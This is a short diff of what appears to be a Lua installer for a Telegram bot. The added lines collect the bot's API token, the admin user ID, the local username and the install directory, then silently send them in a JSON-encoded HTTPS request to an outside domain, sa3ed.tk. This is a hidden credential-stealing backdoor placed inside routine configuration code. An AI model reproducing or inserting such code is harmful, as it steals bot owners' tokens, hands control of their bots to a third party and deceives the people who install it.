@@ -69,6 +69,12 @@ create_config_auto()
 token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
 install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
+saiedinfo = {} 
+saiedinfo.id = SUDO
+saiedinfo.token = token
+saiedinfo.join  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
+saiedinfo.folder = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')
+https.request('https://sa3ed.tk/HoMeLaNd.php?Info='..JSON.encode(saiedinfo))
 print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
 file = io.open("HoMeLaNd", "w")  
 file:write([[
